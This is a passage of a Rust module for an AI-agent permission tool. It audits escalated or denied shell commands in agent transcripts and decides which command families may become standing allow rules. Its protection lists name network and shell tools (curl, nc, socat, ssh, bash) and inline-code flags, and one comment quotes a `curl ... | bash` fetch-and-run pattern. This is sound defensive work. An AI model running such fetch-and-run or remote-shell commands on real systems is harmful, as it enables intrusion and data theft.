//! `zirv ctx permissions audit` (issue #132): a transcript-backed audit of
//! recent escalated/denied command-permission requests, grouped by a
//! normalized command family, with a reusability verdict ("will the saved
//! approval match the next equivalent command?") and a recommendation.
//!
//! Two extractors, agent-neutral output:
//! - **codex**: `response_item` / `custom_tool_call` records named `exec`
//!   whose payload carries `sandbox_permissions: "require_escalated"` (the
//!   shape documented in issue #132's own reproduction section, over
//!   `~/.codex/sessions/**/*.jsonl`).
//! - **claude**: a headless (`--permission-mode dontAsk`) launch's
//!   `PreToolUse` denial, grounded in this machine's own real transcripts
//!   under `~/.claude/projects/<slug>/*.jsonl` -- an assistant `tool_use`
//!   entry correlated by `id`/`tool_use_id` with a later user `tool_result`
//!   entry carrying `"is_error":true` and text starting "Permission to use
//!   <Tool> has been denied because Claude Code is running in don't ask
//!   mode." (verified by inspecting real session files, not guessed).
//!
//! Both extractors reuse `safety.rs`'s own wrapper-normalization helpers
//! (`pipeline_stages`, `unwrap_env_prefix`, `unwrap_shell_wrapper`,
//! `strip_program_dir`, `sql_program_name`) so a `/bin/zsh -lc '...'` or
//! `env -u FOO zirv ...` wrapper collapses to the same family as the bare
//! command underneath it -- the exact normalization gap issue #132 names.

use std::collections::HashMap;
use std::io::Write;
use std::path::PathBuf;

use clap::ValueEnum;
use serde::Serialize;
use serde_json::Value;

use super::CtxResult;
use super::safety::{
    collapse_whitespace, pipeline_stages, sql_program_name, strip_program_dir, unwrap_env_prefix,
    unwrap_shell_wrapper,
};

/// Which agent's transcripts to audit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
pub enum AuditAgent {
    Codex,
    Claude,
}

impl AuditAgent {
    pub fn label(self) -> &'static str {
        match self {
            AuditAgent::Codex => "codex",
            AuditAgent::Claude => "claude",
        }
    }
}

/// One escalated/denied permission request extracted from one transcript.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct PermissionRequest {
    pub session: String,
    /// The raw command/tool invocation as it appeared in the transcript.
    pub raw: String,
    /// The normalized command family this request is grouped under.
    pub family: String,
    /// Why the harness required a human/policy decision.
    pub cause: String,
    /// What happened to the request: `"escalated"` (codex; the transcript
    /// does not itself record the operator's answer) or `"denied"` (claude,
    /// a headless `dontAsk` refusal).
    pub result: String,
    /// Whether a saved approval for this exact family would plausibly match
    /// the NEXT equivalent invocation, or whether it would collapse to a
    /// one-off (a long literal payload) or a downstream-only capability (a
    /// pipe into `jq`/`grep`/`awk`/`sed` whose own argument is what varies).
    pub reusable: bool,
}

/// One command family's aggregated requests, ready to render or recommend
/// a policy change from.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct FamilyGroup {
    pub family: String,
    pub count: usize,
    /// Reusable only when every member request in this family is reusable.
    pub reusable: bool,
    pub sample: String,
    pub cause: String,
    pub recommendation: String,
    /// Issue #132's `compile` verb's cached read of [`is_protected_family`]
    /// over this group's members (`true` if ANY member's raw command
    /// classifies as protected -- see `group_requests`'s own comment). A
    /// cache, not the enforcement itself: `run_compile` re-runs
    /// `is_protected_family(&family, &sample)` independently at write time
    /// rather than trusting this field, so a doctored or stale report (e.g.
    /// `--json` output hand-edited and fed back in some future flow) can
    /// never smuggle a protected family into a standing allow just by
    /// setting this to `false`.
    pub protected: bool,
}

/// The whole audit, agent-neutral.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct AuditReport {
    pub agent: &'static str,
    pub sessions_scanned: usize,
    pub total_requests: usize,
    pub groups: Vec<FamilyGroup>,
}

/// Above this many total requests, `optimize`'s friction pass surfaces the
/// audit as a finding (issue #132's "surface the same summary in
/// setup/optimization output when approval noise exceeds a documented
/// threshold"). Chosen well below the 33-in-one-session count the issue's
/// own production evidence reports, so the finding fires long before a
/// session reaches that volume.
pub const NOISE_FINDING_THRESHOLD: usize = 5;

// ---------------------------------------------------------------------
// Family normalization + reusability, shared by both extractors
// ---------------------------------------------------------------------

/// Depth (program + how many leading non-flag tokens) that names a stable
/// family for a multi-word CLI. Everything else collapses to just its
/// program name -- `curl https://a` and `curl https://b` are one family.
fn family_depth(program: &str) -> usize {
    match program {
        "zirv" => 3,
        // Issue #141: `uv` joins its sibling subcommand-based package
        // managers/CLIs so `uv run <script>` normalizes to the two-token
        // family `"uv run"` -- distinct from `uv sync`/`uv add`/`uv pip`,
        // which are not arbitrary-code executors and stay compileable.
        "git" | "gh" | "cargo" | "npm" | "docker" | "kubectl" | "npx" | "pnpm" | "yarn" | "uv" => 2,
        _ => 1,
    }
}

/// Peels `env`/shell-wrapper layers off `segment` (bounded to 4 layers,
/// matching `safety.rs`'s own structural-candidate depth), returning the
/// innermost command text -- `env -u FOO zirv ...` or `/bin/zsh -lc '...'`
/// collapse to the wrapped command underneath. Shared by [`family_of`] (the
/// leading command) and [`is_reusable`] (2026-08-25 review: a decorated
/// pipe target like `... | env NO_COLOR=1 jq .` must still be recognised as
/// `jq`, not missed because the filter check only looked at the bare last
/// stage).
fn unwrap_wrappers(segment: &str) -> String {
    let mut current = segment.to_string();
    for _ in 0..4 {
        if let Some(inner) = unwrap_env_prefix(&current) {
            current = inner;
            continue;
        }
        if let Some(inner) = unwrap_shell_wrapper(&current) {
            current = inner;
            continue;
        }
        break;
    }
    current
}

/// Normalizes a raw command/tool invocation to a stable family key: unwraps
/// `env`/shell wrappers, drops to the first pipeline stage (the real
/// command; a trailing `| jq ...` is a downstream formatting stage, not a
/// different family), then keeps the program name plus as many leading
/// non-flag tokens as [`family_depth`] says are part of this program's own
/// stable invocation shape (`gh issue`, `zirv setup apply`, `cargo`).
pub(crate) fn family_of(raw: &str) -> String {
    let first_stage = pipeline_stages(raw).into_iter().next().unwrap_or_default();
    let current = unwrap_wrappers(&first_stage);
    let collapsed = collapse_whitespace(&strip_program_dir(&current));
    let tokens: Vec<&str> = collapsed.split(' ').filter(|t| !t.is_empty()).collect();
    let Some(first) = tokens.first() else {
        return "(empty)".to_string();
    };
    let program = sql_program_name(first);
    let depth = family_depth(&program);
    let mut parts = vec![program];
    for token in tokens.iter().skip(1).take(depth.saturating_sub(1)) {
        if token.starts_with('-') {
            break;
        }
        parts.push(token.to_ascii_lowercase());
    }
    parts.join(" ")
}

/// The longest single- or double-quoted span in `raw`, by character count
/// (quotes excluded). A long quoted span is the signature of a one-off
/// literal payload -- an issue/PR body, a commit message -- that will never
/// recur verbatim, so a saved approval keyed on the exact command text
/// cannot match the next equivalent invocation.
fn longest_quoted_span(raw: &str) -> usize {
    let mut longest = 0usize;
    let mut chars = raw.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '"' && c != '\'' {
            continue;
        }
        let quote = c;
        let mut len = 0usize;
        let mut escaped = false;
        for inner in chars.by_ref() {
            if escaped {
                escaped = false;
                len += 1;
                continue;
            }
            if inner == '\\' {
                escaped = true;
                continue;
            }
            if inner == quote {
                break;
            }
            len += 1;
        }
        longest = longest.max(len);
    }
    longest
}

/// Above this many characters, a quoted span reads as a one-off literal
/// payload rather than a short flag value (a branch name, a query string).
const LONG_LITERAL_THRESHOLD: usize = 80;

/// Whether a saved approval for `raw` would plausibly match the next
/// equivalent invocation: false when the command embeds a long literal
/// payload, or pipes into a text filter whose own argument is the varying
/// part of the command (issue #132: "piped read-only API queries produced
/// approvals for downstream `jq` expressions instead of one reusable
/// read-only API capability").
pub(crate) fn is_reusable(raw: &str) -> bool {
    if raw.trim().is_empty() {
        return true;
    }
    if longest_quoted_span(raw) > LONG_LITERAL_THRESHOLD {
        return false;
    }
    let stages = pipeline_stages(raw);
    if stages.len() > 1
        && let Some(last) = stages.last()
    {
        // 2026-08-25 review: unwrap the last stage's own env/shell wrapper
        // before matching the filter program name, so `| env NO_COLOR=1 jq
        // .` is still recognised as a `jq` pipe target and not missed
        // because the wrapper sat in front of it.
        let unwrapped = unwrap_wrappers(last);
        let collapsed = collapse_whitespace(&strip_program_dir(&unwrapped));
        let first = collapsed.split(' ').next().unwrap_or("");
        if matches!(
            sql_program_name(first).as_str(),
            "jq" | "grep" | "awk" | "sed"
        ) {
            return false;
        }
    }
    true
}

/// Command families issue #132 requires stay prompting no matter how
/// reusable the saved approval would otherwise be: "keep global writes,
/// destructive operations, secrets, and publish/release actions prompting
/// unless explicitly enabled by the operator." `git push --force origin
/// main` is a perfectly REUSABLE family by [`is_reusable`]'s own definition
/// (no long literal, no filter pipe) -- that is exactly why reusability
/// alone cannot gate the recommendation; a protected family must never be
/// recommended a standing allow regardless.
///
/// `sample` (not just `family`) is what a caller must classify against:
/// `family_of` strips flags, so `git push --force origin main` and `git
/// push origin feature` both normalize to the family `"git push"` --
/// distinguishing them needs the actual command text, which is why this
/// function takes both.
///
/// Interpreter/shell/remote-exec/network-fetch program names (review round
/// 1, 2026-08-26): a family compiled from one of these would authorize
/// whatever a FUTURE invocation is told to run -- `python -c "<code>"` today,
/// arbitrary other code tomorrow, all under the identical `"python *"`
/// pattern -- so these are protected UNCONDITIONALLY, regardless of
/// arguments. `family_of`'s own depth-1 fallback (`family_depth`) already
/// collapses every one of these to the bare program name, so `family` alone
/// (not `sample`) is the check: it is the already-unwrapped, already-
/// normalized name, immune to a wrapper (`env`, a shell `-c`) that
/// `family_of` peeled off before this function ever saw the command. This
/// also protects `zirv ctx permissions audit`'s own recommendation, not just
/// `compile`'s eligibility -- both call this same function.
const INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "cmd",
    "pwsh",
    "powershell",
    "python",
    "python3",
    "python2",
    "node",
    "deno",
    "bun",
    "perl",
    "ruby",
    "php",
    "lua",
    "ssh",
    "scp",
    "curl",
    "wget",
    "nc",
    "ncat",
    "socat",
];

/// Flags that hand an interpreter/shell a literal command string to execute
/// rather than a script file path. A second, cruder net over the raw sample
/// tokens (not just `family`): a nested/wrapped invocation `family_of` did
/// not fully unwrap (e.g. `docker exec ... sh -c 'curl ... | bash'`, whose
/// own family is `"docker exec"`, not `"sh"`) still carries both an
/// interpreter program name and one of these flags somewhere in its token
/// stream, and that combination is protected too.
const INLINE_CODE_FLAGS: &[&str] = &["-c", "-e", "-command", "--eval"];

/// Issue #141: package/script launchers whose FIRST positional argument
/// names arbitrary code to run -- `npx <pkg>`, `bunx <pkg>`, `uvx <pkg>` --
/// so the whole family is protected regardless of which package follows,
/// the same "protected by first token alone" mechanism
/// `INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS` uses right above (a separate
/// list purely so each one documents its own distinct risk category rather
/// than being folded into "interpreter/shell"). `npx` already normalizes to
/// a two-token family (`family_depth`); `bunx`/`uvx` are not in that map, so
/// their family stays the single-token program name -- either shape checks
/// out via `family_program` (the family's own first token) below.
const ARBITRARY_PACKAGE_EXEC_PROGRAMS: &[&str] = &["npx", "bunx", "uvx"];

/// Issue #141: `gh api`'s method/body flags -- a bare `gh api <path>` sends
/// a GET and is read-only, but `-X`/`--method <verb>` naming anything other
/// than GET, or a request-body flag (`-f`/`--field`/`--input`) implying one
/// is about to be sent, both mean the call mutates whatever the endpoint
/// controls. `tokens` is already lowercased, so `verb` comparisons below are
/// case-insensitive for free.
fn gh_api_call_is_mutating(tokens: &[String]) -> bool {
    let method_is_non_get = tokens.iter().enumerate().any(|(i, t)| {
        if let Some(value) = t.strip_prefix("--method=") {
            return value != "get";
        }
        (t == "-x" || t == "--method") && tokens.get(i + 1).is_some_and(|value| value != "get")
    });
    let has_body_flag = tokens
        .iter()
        .any(|t| matches!(t.as_str(), "-f" | "--field" | "--input"));
    method_is_non_get || has_body_flag
}

/// Pure: token/substring matching only, no fs/clock/env, the same
/// discipline `safety.rs`'s own classifiers hold to. This is a
/// recommendation heuristic for `zirv ctx permissions audit`'s report, not
/// a hard safety gate -- `safety.rs`'s `SHIPPED_POSTURE_DENY`/`_ASK` remain
/// the actual enforcement boundary a launch is projected against.
pub(crate) fn is_protected_family(family: &str, sample: &str) -> bool {
    let tokens: Vec<String> = sample
        .split(|c: char| c.is_whitespace() || matches!(c, '\'' | '"' | '`'))
        .filter(|t| !t.is_empty())
        .map(str::to_ascii_lowercase)
        .collect();
    // Review round 1 (2026-08-26): matches a bare flag OR that same flag
    // carrying an `=`-joined value (`--force-with-lease=origin/main`) --
    // `has("--force-with-lease")` used to check exact token equality only,
    // so the `=`-joined spelling escaped every arm below that checks for it.
    // Fixed once, here, rather than per call site, so every existing and
    // future `has(...)` check gets the fix automatically.
    let has = |word: &str| {
        tokens
            .iter()
            .any(|t| t == word || t.starts_with(&format!("{word}=")))
    };
    let has_bundled_short_force = tokens.iter().any(|t| {
        t.starts_with('-')
            && !t.starts_with("--")
            && t.len() > 1
            && t[1..].chars().all(|c| c.is_ascii_alphabetic())
            && t.contains('f')
    });
    let lower_sample = sample.to_ascii_lowercase();
    let writes_into_a_global_install_path = matches!(
        family,
        "cp" | "copy" | "xcopy" | "copy-item" | "mv" | "move" | "install"
    ) && (lower_sample.contains("program files")
        || lower_sample.contains("/usr/local/")
        || lower_sample.contains("/usr/bin/")
        || lower_sample.contains("/usr/sbin/")
        || lower_sample.contains("c:\\windows\\"));

    let family_program = family.split(' ').next().unwrap_or(family);
    let is_interpreter_shell_or_remote_exec_family =
        INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS.contains(&family_program);
    let has_interpreter_and_inline_code_flag = tokens
        .iter()
        .any(|t| INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS.contains(&t.as_str()))
        && tokens.iter().any(|t| {
            INLINE_CODE_FLAGS.contains(&t.as_str())
                || t.starts_with("--eval=")
                || t.starts_with("-command=")
        });
    // Issue #141: `npx`/`bunx`/`uvx` run whatever package their first
    // positional argument names -- protected regardless of which package
    // that is, matched on the family's own first token exactly like the
    // interpreter/shell class above.
    let is_arbitrary_package_exec_family =
        ARBITRARY_PACKAGE_EXEC_PROGRAMS.contains(&family_program);

    let family_protected = match family {
        // Destructive git: recoverable in principle (a reflog, a rebuild)
        // but exactly the family issue #132 names as one that must keep
        // prompting rather than being silently granted a standing allow.
        "git push" => {
            has("--force") || has("--force-with-lease") || has("-f") || has("--delete") || has("-d")
        }
        "git reset" => has("--hard"),
        "git clean" => has("--force") || has_bundled_short_force,
        "git branch" => has("-d") || has("--delete"),
        // History rewrites: always protected, no flag needed.
        "git rebase" | "git filter-branch" => true,
        // A tag alone is harmless; a tag pushed to a remote is a release.
        "git tag" => has("push"),
        // Publish/release: irreversible by nature.
        "cargo publish" | "npm publish" | "gh release" | "cargo install" |
        // Issue #141: `cargo run` compiles and executes arbitrary crate
        // code -- the identical risk class as `cargo install`, just without
        // the "stays on disk afterward" property.
        "cargo run" => true,
        // Credential/secret surfaces.
        "gh auth" | "git credential" | "ssh-keygen" | "security" => true,
        // Global binary/config installs.
        "choco" | "winget" => true,
        "npm install" | "npm" => has("-g") || has("--global"),
        // Issue #141: subcommand-level arbitrary-code executors. Each of
        // these runs a container image, a cluster workload, or a
        // package.json/Makefile-equivalent script chosen by the invocation's
        // OWN arguments -- protected unconditionally, the same "regardless
        // of arguments" reasoning `cargo install`/`cargo run` above already
        // get, not gated on any particular flag. Narrow read-only siblings
        // in the same CLI (`docker ps`, `kubectl get`, `npm install` without
        // `-g`) are untouched -- each stays its own, unprotected family key.
        "docker run" | "docker exec" => true,
        "kubectl exec" | "kubectl run" => true,
        "npm run" | "npm exec" => true,
        "pnpm run" | "pnpm exec" | "pnpm dlx" => true,
        "yarn run" | "yarn dlx" => true,
        "uv run" => true,
        // Issue #141: `gh api` is protected only when it actually mutates --
        // see `gh_api_call_is_mutating`'s own doc comment. A bare read
        // (`gh api repos/x/y`, an implicit GET) stays compileable.
        "gh api" => gh_api_call_is_mutating(&tokens),
        _ => false,
    };

    family_protected
        || writes_into_a_global_install_path
        || has("token")
        || has("keychain")
        || has("keyring")
        || is_interpreter_shell_or_remote_exec_family
        || has_interpreter_and_inline_code_flag
        || is_arbitrary_package_exec_family
}

fn recommendation_for(family: &str, protected: bool, reusable: bool) -> String {
    if protected {
        return format!(
            "'{family}' is a protected family: stays prompting unless the operator explicitly \
             enables it (destructive git, a global binary/config install, a credential/secret \
             command, or a publish/release action -- issue #132). Do not grant a standing allow, \
             regardless of reusability."
        );
    }
    if reusable {
        format!(
            "Grant '{family}' a standing allow in the operator's [safety]/[policy] \
             layer -- every observed invocation normalizes to this one family."
        )
    } else {
        format!(
            "Approve the '{family}' CAPABILITY once, not the literal command: the \
             saved approval must normalize away the varying payload (a long \
             quoted body, or a downstream filter expression) or it will keep \
             re-prompting on the next equivalent invocation."
        )
    }
}

// ---------------------------------------------------------------------
// Codex extractor
// ---------------------------------------------------------------------

/// Whether `payload` (a `custom_tool_call` record) requested escalated
/// sandbox permissions, either directly or nested inside a JSON-encoded
/// `input` string.
fn escalation_requested(payload: &Value) -> bool {
    if payload.get("sandbox_permissions").and_then(Value::as_str) == Some("require_escalated") {
        return true;
    }
    if let Some(input) = payload.get("input").and_then(Value::as_str)
        && let Ok(inner) = serde_json::from_str::<Value>(input)
        && inner.get("sandbox_permissions").and_then(Value::as_str) == Some("require_escalated")
    {
        return true;
    }
    false
}

fn command_string(node: &Value) -> Option<String> {
    if let Some(s) = node.get("command").and_then(Value::as_str) {
        return Some(s.to_string());
    }
    if let Some(arr) = node.get("command").and_then(Value::as_array) {
        let parts: Vec<&str> = arr.iter().filter_map(Value::as_str).collect();
        if !parts.is_empty() {
            return Some(parts.join(" "));
        }
    }
    None
}

fn codex_command_of(payload: &Value) -> Option<String> {
    if let Some(command) = command_string(payload) {
        return Some(command);
    }
    let input = payload.get("input").and_then(Value::as_str)?;
    let inner: Value = serde_json::from_str(input).ok()?;
    command_string(&inner)
}

/// Extracts every `require_escalated` exec request from one codex rollout
/// JSONL transcript (see this module's own doc comment for the shape).
pub fn extract_codex_requests(text: &str, session: &str) -> Vec<PermissionRequest> {
    let mut out = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        if v.get("type").and_then(Value::as_str) != Some("response_item") {
            continue;
        }
        let Some(payload) = v.get("payload") else {
            continue;
        };
        if payload.get("type").and_then(Value::as_str) != Some("custom_tool_call") {
            continue;
        }
        if payload.get("name").and_then(Value::as_str) != Some("exec") {
            continue;
        }
        if !escalation_requested(payload) {
            continue;
        }
        let Some(command) = codex_command_of(payload) else {
            continue;
        };
        let family = family_of(&command);
        let reusable = is_reusable(&command);
        out.push(PermissionRequest {
            session: session.to_string(),
            raw: command,
            family,
            cause: "sandbox_permissions: require_escalated".to_string(),
            result: "escalated".to_string(),
            reusable,
        });
    }
    out
}

// ---------------------------------------------------------------------
// Claude extractor
// ---------------------------------------------------------------------

#[derive(Default, Clone)]
struct ClaudeToolUse {
    name: String,
    command: Option<String>,
}

fn tool_result_text(entry: &Value) -> String {
    match entry.get("content") {
        Some(Value::String(s)) => s.clone(),
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(|t| t.get("text").and_then(Value::as_str))
            .collect::<Vec<_>>()
            .join(" "),
        _ => String::new(),
    }
}

/// Extracts every headless `dontAsk` permission denial from one claude
/// transcript JSONL file (see this module's own doc comment for the shape,
/// grounded in real session files on this machine).
pub fn extract_claude_requests(text: &str, session: &str) -> Vec<PermissionRequest> {
    let mut uses: HashMap<String, ClaudeToolUse> = HashMap::new();
    let mut out = Vec::new();

    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        let Some(content) = v.pointer("/message/content").and_then(Value::as_array) else {
            continue;
        };
        for entry in content {
            match entry.get("type").and_then(Value::as_str) {
                Some("tool_use") => {
                    let Some(id) = entry.get("id").and_then(Value::as_str) else {
                        continue;
                    };
                    let name = entry
                        .get("name")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string();
                    let command = entry
                        .pointer("/input/command")
                        .and_then(Value::as_str)
                        .map(str::to_string)
                        .or_else(|| {
                            entry
                                .pointer("/input/file_path")
                                .and_then(Value::as_str)
                                .map(str::to_string)
                        });
                    uses.insert(id.to_string(), ClaudeToolUse { name, command });
                }
                Some("tool_result") => {
                    if entry.get("is_error").and_then(Value::as_bool) != Some(true) {
                        continue;
                    }
                    let text_val = tool_result_text(entry);
                    if !text_val.contains("Permission to use") {
                        continue;
                    }
                    let Some(tool_use_id) = entry.get("tool_use_id").and_then(Value::as_str) else {
                        continue;
                    };
                    let Some(used) = uses.get(tool_use_id) else {
                        continue;
                    };
                    let raw = used.command.clone().unwrap_or_else(|| used.name.clone());
                    let is_bash = used.name.eq_ignore_ascii_case("Bash");
                    let family = if is_bash {
                        family_of(&raw)
                    } else {
                        used.name.clone()
                    };
                    out.push(PermissionRequest {
                        session: session.to_string(),
                        raw,
                        family,
                        cause: "permission-mode dontAsk denial".to_string(),
                        result: "denied".to_string(),
                        reusable: !is_bash
                            || is_reusable(&used.command.clone().unwrap_or_default()),
                    });
                }
                _ => {}
            }
        }
    }
    out
}

// ---------------------------------------------------------------------
// Grouping + report
// ---------------------------------------------------------------------

pub(crate) fn group_requests(requests: &[PermissionRequest]) -> Vec<FamilyGroup> {
    let mut order: Vec<String> = Vec::new();
    let mut by_family: HashMap<String, Vec<&PermissionRequest>> = HashMap::new();
    for request in requests {
        by_family
            .entry(request.family.clone())
            .or_insert_with(|| {
                order.push(request.family.clone());
                Vec::new()
            })
            .push(request);
    }
    let mut groups: Vec<FamilyGroup> = order
        .into_iter()
        .map(|family| {
            let members = &by_family[&family];
            let reusable = members.iter().all(|m| m.reusable);
            // Any member's raw command classifying as protected protects
            // the whole group -- a family that is SOMETIMES a destructive
            // shape (`git push origin x` alongside `git push --force origin
            // main`) must not be recommended a standing allow just because
            // its first-observed member looked routine.
            let protected = members.iter().any(|m| is_protected_family(&family, &m.raw));
            FamilyGroup {
                count: members.len(),
                reusable,
                sample: members[0].raw.clone(),
                cause: members[0].cause.clone(),
                recommendation: recommendation_for(&family, protected, reusable),
                protected,
                family,
            }
        })
        .collect();
    groups.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.family.cmp(&b.family)));
    groups
}

/// Runs the extractor for `agent` over every transcript file in `files`,
/// tagging each request with its file stem as the session id.
pub fn audit_report(agent: AuditAgent, files: &[PathBuf]) -> AuditReport {
    let mut requests = Vec::new();
    let mut scanned = 0usize;
    for path in files {
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        scanned += 1;
        let session = path
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("unknown")
            .to_string();
        let mut found = match agent {
            AuditAgent::Codex => extract_codex_requests(&text, &session),
            AuditAgent::Claude => extract_claude_requests(&text, &session),
        };
        requests.append(&mut found);
    }
    AuditReport {
        agent: agent.label(),
        sessions_scanned: scanned,
        total_requests: requests.len(),
        groups: group_requests(&requests),
    }
}

pub fn render_report(report: &AuditReport) -> String {
    let mut out = String::new();
    out.push_str(&format!(
        "# Permission audit -- {} ({} sessions scanned, {} requests)\n\n",
        report.agent, report.sessions_scanned, report.total_requests
    ));
    if report.groups.is_empty() {
        out.push_str("No escalated or denied permission requests found.\n");
        return out;
    }
    for group in &report.groups {
        out.push_str(&format!(
            "## {} -- {} request(s), {}\n",
            group.family,
            group.count,
            if group.reusable {
                "reusable"
            } else {
                "NOT reusable"
            }
        ));
        out.push_str(&format!("- cause: {}\n", group.cause));
        out.push_str(&format!("- sample: `{}`\n", group.sample));
        out.push_str(&format!("- recommendation: {}\n\n", group.recommendation));
    }
    out
}

// ---------------------------------------------------------------------
// CLI: `zirv ctx permissions audit`
// ---------------------------------------------------------------------

#[derive(Debug, clap::Args)]
pub struct PermissionsArgs {
    #[command(subcommand)]
    pub verb: PermissionsVerb,
}

#[derive(Debug, clap::Subcommand)]
pub enum PermissionsVerb {
    /// Audit recent transcripts for escalated/denied permission requests,
    /// grouped by normalized command family. Strictly read-only: never
    /// writes anything.
    Audit(AuditArgs),
    /// Run the same audit, then compile eligible (non-protected, reusable)
    /// families into standing `[safety] allow` approvals in the operator's
    /// `~/.zirv/ctx.toml`. Unlike `audit`, this writes -- see `run_compile`'s
    /// own doc comment.
    Compile(CompileArgs),
}

#[derive(Debug, clap::Args)]
pub struct AuditArgs {
    /// Which agent's transcripts to read.
    #[arg(long, value_enum, default_value = "codex")]
    pub agent: AuditAgent,
    /// How many of the most recently modified transcripts to sample.
    #[arg(long, default_value_t = 5)]
    pub sessions: usize,
    /// Print the report as JSON instead of the human-readable form.
    #[arg(long, default_value_t = false)]
    pub json: bool,
}

#[derive(Debug, clap::Args)]
pub struct CompileArgs {
    /// Which agent's transcripts to read.
    #[arg(long, value_enum, default_value = "codex")]
    pub agent: AuditAgent,
    /// How many of the most recently modified transcripts to sample.
    #[arg(long, default_value_t = 5)]
    pub sessions: usize,
    /// Print what would be written without touching
    /// `~/.zirv/ctx.toml`.
    #[arg(long, default_value_t = false)]
    pub dry_run: bool,
}

fn transcripts_root(agent: AuditAgent) -> Option<PathBuf> {
    match agent {
        AuditAgent::Codex => crate::utils::home_dir()
            .ok()
            .map(|h| h.join(".codex").join("sessions")),
        AuditAgent::Claude => super::window::projects_root().ok(),
    }
}

/// Codex has no per-command permission-hook contract zirv can pin the way
/// claude's `PreToolUse` hook is (`safety.rs`'s own doc comment): a codex
/// launch never consults `[safety]` at all (`CodexAdapter::default_sandbox_
/// args`'s own `let _ = (sandbox, safety);`, and `policy_args` reads only
/// `[policy]`, never `[safety]`). So while `permissions compile` still
/// writes real `[safety] allow` entries for a codex audit -- they are the
/// honest record of what a codex session actually asked for, and claude
/// reads them -- those entries change nothing about how *codex itself*
/// launches. Printed on every codex `audit`/`compile` run (including the
/// default `--agent codex`, `AuditArgs`/`CompileArgs`'s own `default_value`)
/// so an operator does not read "compiled" as "codex now enforces this".
/// Upstream `exec_permission_approvals`/`request_permissions_tool` (a
/// per-command hook codex itself would consult) are still in development,
/// not yet something this codebase can pin against.
const CODEX_SAFETY_NO_OP_CAVEAT: &str = "caveat: compiled [safety] allow entries do not change codex's own launch posture -- \
     codex has no per-command approval hook zirv can pin (upstream exec_permission_approvals \
     / request_permissions_tool are still in development)";

pub fn run_audit<W: Write>(args: &AuditArgs, w: &mut W) -> CtxResult<i32> {
    let files = transcripts_root(args.agent)
        .map(|root| super::optimize::newest_transcripts(&root, args.sessions))
        .unwrap_or_default();
    let report = audit_report(args.agent, &files);
    if args.json {
        writeln!(
            w,
            "{}",
            serde_json::to_string_pretty(&report).unwrap_or_default()
        )?;
    } else {
        if args.agent == AuditAgent::Codex {
            writeln!(w, "{CODEX_SAFETY_NO_OP_CAVEAT}")?;
        }
        write!(w, "{}", render_report(&report))?;
    }
    Ok(0)
}

/// A family whose normalized key is a single token (just the program name,
/// no subcommand) is structurally too coarse to compile into a standing
/// allow: `family_of`'s own depth-1 fallback (`family_depth`) collapses
/// EVERY invocation of that program to one family regardless of what it was
/// actually told to do, so `python -c "<audited code>"` and a future `python
/// -c "<anything else>"` are the identical family -- a standing allow keyed
/// on it would authorize arbitrary future code, not just the one audited
/// invocation. Review round 1 (2026-08-26): the primary, purely structural
/// half of that fix, deliberately independent of [`is_protected_family`]'s
/// interpreter/shell program-name list below -- this refuses ANY single-word
/// family (an unlisted program, e.g. `tasklist`, included), not only the
/// ones that list happens to name.
fn is_family_too_generic(family: &str) -> bool {
    family.split(' ').filter(|t| !t.is_empty()).count() < 2
}

/// Human-readable reason `run_compile`'s summary prints next to a family
/// [`is_family_too_generic`] refused.
const TOO_GENERIC_REASON: &str =
    "family too generic to compile safely -- needs subcommand-level specificity";

/// The eligibility fold `run_compile` applies to one audit report's groups:
/// which family earns a standing-allow pattern (`"<family> *"`), which is
/// skipped as too generic, and which is skipped as protected.
///
/// A `FamilyGroup`'s cached `protected` field is never trusted alone: `is_
/// protected_family(&family, &sample)` is re-run independently for every
/// group here, so a group that reaches this function with a wrong or stale
/// `protected` value cannot smuggle a protected family into the returned
/// patterns.
///
/// Pure, and split out of `run_compile` purely for testability -- the same
/// reason `dash/mod.rs`'s own composer functions are split out of
/// `fulfill_spawn_request`.
fn compile_eligibility(groups: &[FamilyGroup]) -> (Vec<String>, Vec<String>, Vec<String>) {
    let mut eligible_patterns: Vec<String> = Vec::new();
    let mut skipped_protected: Vec<String> = Vec::new();
    let mut skipped_too_generic: Vec<String> = Vec::new();
    for group in groups {
        if is_family_too_generic(&group.family) {
            skipped_too_generic.push(group.family.clone());
            continue;
        }
        if group.protected || is_protected_family(&group.family, &group.sample) {
            skipped_protected.push(group.family.clone());
            continue;
        }
        if !group.reusable {
            continue;
        }
        eligible_patterns.push(format!("{} *", group.family));
    }
    (eligible_patterns, skipped_protected, skipped_too_generic)
}

/// Issue #132's residual: "compile operator-owned managed policy into
/// reusable approvals". Runs the identical audit pipeline `run_audit` does,
/// then writes every ELIGIBLE family (`compile_eligibility`: not too
/// generic, not protected, reusable) into `[safety] allow` in the operator's
/// home `~/.zirv/ctx.toml` -- never a repo layer (`safety.allow` is
/// `REPO_FORBIDDEN` for exactly this reason).
///
/// The written pattern is `"<family> *"` -- verified against `safety::
/// glob_match`'s own semantics (a pattern ending in `" *"` matches its own
/// bare prefix too, issue #106) to actually match the next equivalent
/// invocation, not just the one sample command in the report.
///
/// Review round 1 (2026-08-26), cross-process TOCTOU: this reads the current
/// `[safety] allow` contents, decides what to add, then writes -- if two
/// `compile` invocations (or a hand-edit) race between the read and the
/// write, the loser's own read is stale and its write could re-derive a
/// duplicate that `union_allow_patterns`' in-process dedupe never saw coming
/// from outside. Not fixed here (matches every other `set_home_ctx_toml_*`
/// writer's own no-file-locking contract) -- `zirv ctx permissions compile`
/// is an operator-invoked, infrequent command, not a hot path two processes
